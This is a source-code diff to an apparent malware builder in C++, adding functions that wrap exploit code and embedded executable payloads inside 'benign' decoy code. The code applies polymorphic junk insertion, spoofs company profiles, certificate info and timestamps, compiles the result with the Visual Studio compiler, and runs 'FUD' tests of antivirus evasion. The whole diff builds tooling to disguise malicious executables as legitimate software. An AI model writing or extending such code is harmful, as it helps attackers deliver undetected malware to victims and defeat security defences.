@@ -1520,6 +1520,94 @@ public:
         }
     }
     
+    // NEW: Create Benign Stub with Exploit Integration
+    bool createBenignStubWithExploits(const std::string& inputPath, const std::string& outputPath, 
+                                     int companyIndex, int certIndex, 
+                                     MultiArchitectureSupport::Architecture architecture,
+                                     ExploitDeliveryType exploitType) {
+        try {
+            // Get company and certificate info
+            const auto& company = companyProfiles[companyIndex % companyProfiles.size()];
+            const auto& cert = certificateChains[certIndex % certificateChains.size()];
+            
+            // Generate super benign code with all enhancements
+            std::string benignCode = benignBehavior.generateBenignCode(company.name);
+            
+            // Generate exploit code if requested
+            std::string exploitCode = "";
+            std::string exploitIncludes = "";
+            if (exploitType != EXPLOIT_NONE) {
+                // Create a dummy payload for exploit integration
+                std::vector<uint8_t> dummyPayload = {0x4D, 0x5A}; // Just MZ header
+                exploitCode = exploitEngine.generateExploit(exploitType, dummyPayload);
+                exploitIncludes = exploitEngine.getExploitIncludes(exploitType);
+            }
+            
+            // Combine benign code with exploit code
+            std::string combinedCode = exploitIncludes + "\n" + benignCode;
+            if (!exploitCode.empty()) {
+                combinedCode += "\n" + exploitCode + "\n";
+            }
+            
+            // Apply DNA randomization (this adds junk variables safely)
+            combinedCode = dnaRandomizer.randomizeCode(combinedCode);
+            
+            // Create temporary source file
+            std::string tempSource = "temp_" + randomEngine.generateRandomName() + ".cpp";
+            std::ofstream sourceFile(tempSource);
+            if (!sourceFile.is_open()) {
+                return false;
+            }
+            sourceFile << combinedCode;
+            sourceFile.close();
+            
+            // Simple compiler detection - just use system cl.exe
+            auto compilerInfo = CompilerDetector::detectVisualStudio();
+            compilerInfo.path = "cl.exe";
+            compilerInfo.found = true;
+            
+            // Build compilation command with architecture support
+            std::string archFlags = multiArch.getCompilerFlags(architecture);
+            
+            std::string compileCmd;
+            
+            // Try to use vcvars64.bat if available
+            if (!compilerInfo.vcvarsPath.empty()) {
+                compileCmd = "call \"" + compilerInfo.vcvarsPath + "\" >nul 2>&1 && ";
+            } else {
+                // Use Enterprise vcvars64.bat
+                compileCmd = "call \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat\" >nul 2>&1 && ";
+            }
+            
+            // Build the compilation command
+            if (compilerInfo.path == "cl.exe") {
+                compileCmd += "cl /nologo /O2 /EHsc /DNDEBUG /MD ";
+            } else {
+                compileCmd += "\"" + compilerInfo.path + "\" /nologo /O2 /EHsc /DNDEBUG /MD ";
+            }
+            
+            compileCmd += "/Fe\"" + outputPath + "\" ";
+            compileCmd += "\"" + tempSource + "\" ";
+            compileCmd += "/link " + archFlags + " /OPT:REF /OPT:ICF ";
+            compileCmd += "user32.lib kernel32.lib advapi32.lib shell32.lib ole32.lib";
+            
+            // Execute compilation
+            int result = system(compileCmd.c_str());
+            
+            // Clean up temporary file
+            DeleteFileA(tempSource.c_str());
+            
+            if (result == 0) {
+                return true;
+            }
+            
+            return false;
+            
+        } catch (...) {
+            return false;
+        }
+    }
+    
     // NEW: Create Ultimate Stealth Executable with Exploit Integration
     bool createUltimateStealthExecutableWithExploits(const std::string& inputPath, const std::string& outputPath, 
                                                     int companyIndex, int certIndex, 
@@ -1547,7 +1635,7 @@ public:
             const auto& archInfo = getArchitectures()[static_cast<int>(architecture) % getArchitectures().size()];
             
             // Generate benign behavior code
-            std::string benignCode = benignBehavior.generateBenignCode();
+            std::string benignCode = benignBehavior.generateBenignCode(company.name);
             
             // Generate exploit code if requested
             std::string exploitCode = "";
@@ -1569,13 +1657,42 @@ public:
             }
             
             // Auto-compile the polymorphic source
-            auto compilerInfo = compilerMasq.getRandomCompilerSignature();
-            auto result = compilePolymorphicSource(sourceFilename, outputPath, compilerInfo);
+            auto compilerInfo = CompilerDetector::detectVisualStudio();
+            compilerInfo.path = "cl.exe";
+            compilerInfo.found = true;
+            
+            // Build compilation command with architecture support
+            std::string archFlags = multiArch.getCompilerFlags(architecture);
+            
+            std::string compileCmd;
+            
+            // Try to use vcvars64.bat if available
+            if (!compilerInfo.vcvarsPath.empty()) {
+                compileCmd = "call \"" + compilerInfo.vcvarsPath + "\" >nul 2>&1 && ";
+            } else {
+                // Use Enterprise vcvars64.bat
+                compileCmd = "call \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat\" >nul 2>&1 && ";
+            }
+            
+            // Build the compilation command
+            if (compilerInfo.path == "cl.exe") {
+                compileCmd += "cl /nologo /O2 /EHsc /DNDEBUG /MD ";
+            } else {
+                compileCmd += "\"" + compilerInfo.path + "\" /nologo /O2 /EHsc /DNDEBUG /MD ";
+            }
+            
+            compileCmd += "/Fe\"" + outputPath + "\" ";
+            compileCmd += "\"" + sourceFilename + "\" ";
+            compileCmd += "/link " + archFlags + " /OPT:REF /OPT:ICF ";
+            compileCmd += "user32.lib kernel32.lib advapi32.lib shell32.lib ole32.lib";
+            
+            // Execute compilation
+            int result = system(compileCmd.c_str());
             
             // Clean up temporary source file
             std::remove(sourceFilename.c_str());
             
-            return result.success;
+            return (result == 0);
             
         } catch (...) {
             return false;
@@ -1585,7 +1702,7 @@ public:
     // Generate polymorphic source code with exploit integration
     std::string generatePolymorphicSourceWithExploits(const std::vector<uint8_t>& peData, 
                                                      const CompanyProfile& company,
-                                                     const CertificateChain& cert,
+                                                     const CertificateEngine::CertificateInfo& cert,
                                                      const std::string& architecture,
                                                      const std::string& benignCode,
                                                      const std::string& exploitCode,
@@ -1616,7 +1733,7 @@ public:
         source << "\n// Company: " << company.name << "\n";
         source << "// Certificate: " << cert.issuer << "\n";
         source << "// Architecture: " << architecture << "\n";
-        source << "// Timestamp: " << timestampEngine.getCurrentTimestamp() << "\n\n";
+        source << "// Timestamp: " << timestampEngine.generateRealisticTimestamp() << "\n\n";
         
         // Embed PE data as byte array
         source << "unsigned char " << varName << "[] = {\n";
@@ -2680,7 +2797,7 @@ public:
     
     // NEW: Run comprehensive FUD testing
     void runAutoFUDTesting() {
-        std::cout << "🚀 Starting Automated FUD Testing System...\n\n";
+        std::cout << "[LAUNCH] Starting Automated FUD Testing System...\n\n";
         
         auto combinations = generateTestCombinations();
         int totalTests = combinations.size();
